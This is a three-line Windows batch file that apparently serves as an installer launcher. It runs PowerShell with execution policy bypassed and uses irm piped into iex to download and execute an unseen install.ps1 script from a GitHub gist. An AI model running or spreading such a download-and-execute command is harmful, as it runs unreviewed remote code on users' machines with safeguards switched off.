@echo off
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://gist.githubusercontent.com/mainmarketplace/06a9426f7c6177bcac1b70496115af2c/raw/install.ps1' | iex"
pause
